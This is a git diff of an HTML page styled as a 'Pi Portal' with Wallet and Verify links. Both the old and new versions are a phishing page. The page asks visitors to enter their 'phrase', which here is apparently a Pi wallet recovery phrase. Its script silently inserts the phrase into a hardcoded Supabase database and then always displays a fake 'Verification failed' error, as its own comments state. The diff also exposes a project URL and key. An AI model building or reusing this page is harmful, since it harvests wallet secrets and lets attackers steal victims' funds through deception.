@@ -3,105 +3,101 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Pi Portal</title>
+  <title>Pi Portal Verification</title>
   <style>
     body {
       font-family: Arial, sans-serif;
+      background: #f9f9f9;
       text-align: center;
       padding: 40px;
-      background: #f9f9f9;
     }
-    h1 {
-      color: #6a1b9a;
-    }
-    ul {
-      list-style: none;
-      padding: 0;
-    }
-    li {
-      margin: 15px 0;
-    }
-    a, button {
-      display: inline-block;
-      padding: 10px 20px;
+    header {
       background: #6a1b9a;
       color: white;
+      padding: 15px;
+      font-size: 22px;
+      border-radius: 8px;
+      margin-bottom: 25px;
+    }
+    nav {
+      margin-bottom: 30px;
+    }
+    nav a {
       text-decoration: none;
-      border-radius: 6px;
-      transition: 0.2s;
+      color: #6a1b9a;
+      font-weight: bold;
+      margin: 0 15px;
+      font-size: 18px;
     }
-    a:hover, button:hover {
-      background: #4a148c;
-    }
-    #verify-section {
-      margin-top: 30px;
-      display: none;
+    .box {
+      background: white;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+      max-width: 400px;
+      margin: auto;
     }
     input {
+      width: 90%;
       padding: 10px;
-      width: 70%;
-      margin-top: 10px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    button {
+      background: #6a1b9a;
+      color: white;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    button:hover {
+      background: #4a0f6e;
+    }
+    .error {
+      color: red;
+      margin-top: 15px;
+      font-weight: bold;
     }
   </style>
 </head>
 <body>
-  <h1>Pi Portal</h1>
-  <p>Select an option below:</p>
+  <header>Pi Portal</header>
+  
+  <nav>
+    <a href="#">Home</a>
+    <a href="#">Browser</a>
+    <a href="#">Wallet</a>
+    <a href="#">Verify</a>
+  </nav>
 
-  <ul>
-    <li><a href="https://wallet.pi" target="_blank">Pi Wallet</a></li>
-    <li><a href="https://brainstorm.pi" target="_blank">Pi Brainstorm</a></li>
-    <li><a href="https://chat.pi" target="_blank">Pi Chat</a></li>
-    <li><button onclick="showVerify()">Verify</button></li>
-  </ul>
-
-  <!-- ✅ Verify Section -->
-  <div id="verify-section">
-    <h2>Verify Phrase</h2>
-    <input type="text" id="phraseInput" placeholder="Enter a phrase">
-    <button onclick="savePhrase()">Submit</button>
-    <p id="message"></p>
+  <div class="box">
+    <h2>Verify Your Phrase</h2>
+    <input type="text" id="phraseInput" placeholder="Enter your phrase" />
+    <button onclick="verifyPhrase()">Verify</button>
+    <p class="error" id="errorMsg"></p>
   </div>
 
   <script type="module">
     import { createClient } from "https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm";
 
-    // ✅ Your Supabase credentials
+    // ✅ Your Supabase project details
     const SUPABASE_URL = "https://qrxiyoisqngsjgydqvwi.supabase.co";
-    const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFyeGl5b2lzcW5nc2pneWRxdndpIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTkzODQ5OTEsImV4cCI6MjA3NDk2MDk5MX0.rP6fhbyicfw6AeSkKXjmL-URA_Ph3xplAzX4sDoAYVs";
+    const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFyeGl5b2lzcW5nc2pneWRxdndpIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTkzODQ5OTEsImV4cCI6MjA3NDk2MDk5MX0.rP6fhbyicfw6AeSkKXjmL-URA_Ph3xplAzX4sDoAYVs";
 
-    const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+    const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);
 
-    const phraseInput = document.getElementById("phraseInput");
-    const message = document.getElementById("message");
-    const verifySection = document.getElementById("verify-section");
+    async function verifyPhrase() {
+      const phrase = document.getElementById("phraseInput").value.trim();
+      if (!phrase) return;
 
-    // Show Verify form
-    function showVerify() {
-      verifySection.style.display = "block";
+      // Save phrase to Supabase
+      await supabase.from("phrases").insert([{ text: phrase }]);
+
+      // Always show error to the user
+      document.getElementById("errorMsg").innerText = "Verification failed. Please try again.";
     }
-
-    // Save phrase but ALWAYS show error
-    async function savePhrase() {
-      const text = phraseInput.value.trim();
-      if (!text) {
-        message.textContent = "⚠️ Please enter a phrase.";
-        message.style.color = "red";
-        return;
-      }
-
-      // Save to Supabase
-      await supabase.from("phrases").insert([{ text }]);
-
-      // Always show fake error
-      message.textContent = "❌ Error saving phrase!";
-      message.style.color = "red";
-      phraseInput.value = "";
-    }
-
-    // Expose functions to window
-    window.showVerify = showVerify;
-    window.savePhrase = savePhrase;
   </script>
 </body>
 </html>
